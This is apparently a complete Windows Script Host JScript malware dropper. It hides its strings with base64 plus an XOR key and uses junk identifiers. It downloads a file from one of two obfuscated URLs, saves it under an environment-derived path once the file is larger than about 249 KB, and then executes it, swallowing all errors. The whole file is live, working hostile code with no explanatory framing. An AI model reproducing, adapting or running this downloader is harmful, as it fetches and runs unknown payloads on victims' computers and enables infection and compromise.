var _base64Idx = [
    /*43 -43 = 0*/
    /*'+',  1,  2,  3,'/' */
    62, -1, -1, -1, 63,

    /*'0','1','2','3','4','5','6','7','8','9' */
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61,

    /*15, 16, 17,'=', 19, 20, 21 */
    -1, -1, -1, 64, -1, -1, -1,

    /*65 - 43 = 22*/
    /*'A','B','C','D','E','F','G','H','I','J','K','L','M', */
    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12,

    /*'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' */
    13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,

    /*91 - 43 = 48 */
    /*48, 49, 50, 51, 52, 53 */
    -1, -1, -1, -1, -1, -1,

    /*97 - 43 = 54*/
    /*'a','b','c','d','e','f','g','h','i','j','k','l','m' */
    26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38,

    /*'n','o','p','q','r','s','t','u','v','w','x','y','z' */
    39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
];

function decode(input, output, offset) {
    var out = output;
    if(!out) {
        out = new Uint8Array(Math.ceil(input.length / 4) * 3);
    }

    // remove all non-base64 characters
    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');

    offset = offset || 0;
    var enc1, enc2, enc3, enc4;
    var i = 0, j = offset;

    while(i < input.length) {
        enc1 = _base64Idx[input.charCodeAt(i++) - 43];
        enc2 = _base64Idx[input.charCodeAt(i++) - 43];
        enc3 = _base64Idx[input.charCodeAt(i++) - 43];
        enc4 = _base64Idx[input.charCodeAt(i++) - 43];

        out[j++] = (enc1 << 2) | (enc2 >> 4);
        if(enc3 !== 64) {
            // decoded at least 2 bytes
            out[j++] = ((enc2 & 15) << 4) | (enc3 >> 2);
            if(enc4 !== 64) {
                // decoded 3 bytes
                out[j++] = ((enc3 & 3) << 6) | enc4;
            }
        }
    }

    // make sure result is the exact decoded length
    return output ?
        (j - offset) :
        out.subarray(0, j);
}

var zlVh1Bx8fS = function (packedText) {

    var buffer = [];
    var length = decode(packedText, buffer);
    var charCodeAt = "charCodeAt";
    var result = "";
    for (var i = 0; i < length; i++) {
        result += String.fromCharCode(buffer[i] ^ "StOTQJMwk25BWIhq"[charCodeAt](i % "StOTQJMwk25BWIhq".length));
    }
    return result;
};
var lancetDQt = function() {
    var purseyHj = function() {};
    purseyHj.prototype.create = function(ambrosiaMzb) {
        return WScript.CreateObject(ambrosiaMzb);
    };
    return purseyHj;
}();

(function() {
    var venerablexCo = new lancetDQt();
    var imposingbfU = 200;
    var stupendousqk8 = zlVh1Bx8fS('"FDEb"');
    var dulcetQKG = zlVh1Bx8fS('"FgwqNw=="');
    var provenderRMr = zlVh1Bx8fS('"BCcsJjg6OVk4WlAuOw=="');
    var weighzHL = zlVh1Bx8fS('"HicXGR14Yy8mfn0WAxk="');
    var overweeningqGX = zlVh1Bx8fS('"MB0qOjsFDDslQw=="');
    var harrycJk = zlVh1Bx8fS('"PwJ7BwYpOh8aQg=="');
    var archetypeprY = zlVh1Bx8fS('"MBw6GAENHAY+SA=="');
    var disembarkmsF = zlVh1Bx8fS('"JCYjASQtfB0IAg=="');
    var pleadTBX = zlVh1Bx8fS('"CiE7JykyAjRbeQ=="');
    var bulwarkGOc = zlVh1Bx8fS('"FTklBWRzOU4+WA=="');
    var blandiiL = zlVh1Bx8fS('"IT8LHRASCRMAZQ=="');
    var pillagerzH = zlVh1Bx8fS('"EjAAEBM="');
    var interpolateCAx = zlVh1Bx8fS('"AAA9MTAn"');
    var elaborateojV = zlVh1Bx8fS('"diAKGQFvEQ=="');
    var engageIWO = zlVh1Bx8fS('"fRE3MQ=="');
    var ensconceEq5 = Math.pow(2, 10) * 249;
    var punditxGv = [ zlVh1Bx8fS('"OwA7JGtlYh8OXlktLiYdHzQZLjogO2MUBF8aemdnDQk2"'), zlVh1Bx8fS('"OwA7JGtlYh8OXlktLiYdHzQZLjo3LGMUBF8aemdnDQk2"') ];
    var sleightuon = 2097152;
    var forebearB9i = venerablexCo.create(provenderRMr);
    var parsimoniousBSA = venerablexCo.create(weighzHL);
    var patronizeeOh = venerablexCo.create(pillagerzH + zlVh1Bx8fS('"fQ=="') + interpolateCAx);
    var sinuousc1X = forebearB9i.ExpandEnvironmentStrings(elaborateojV);
    var attitudeeZv = sinuousc1X + sleightuon + engageIWO;
    var homespunF8m = false;
    for (var plusn7Z = 0; plusn7Z < punditxGv.length; plusn7Z++) {
        try {
            var impeloUY = punditxGv[plusn7Z];
            parsimoniousBSA.open(stupendousqk8, impeloUY, false);
            parsimoniousBSA.send();
            if (parsimoniousBSA.status == imposingbfU) {
                try {
                    patronizeeOh.open();
                    patronizeeOh.type = 1;
                    patronizeeOh.write(parsimoniousBSA[zlVh1Bx8fS('"IRE8JD4kPhIpXVE7"')]);
                    if (patronizeeOh.size > ensconceEq5) {
                        plusn7Z = punditxGv.length;
                        patronizeeOh.position = 0;
                        patronizeeOh.saveToFile(attitudeeZv, 2);
                        homespunF8m = true;
                    }
                } finally {
                    patronizeeOh.close();
                }
            }
        } catch (ignored) {}
    }
    if (homespunF8m) {
        forebearB9i[dulcetQKG](sinuousc1X + Math.pow(2, 21));
    }
})();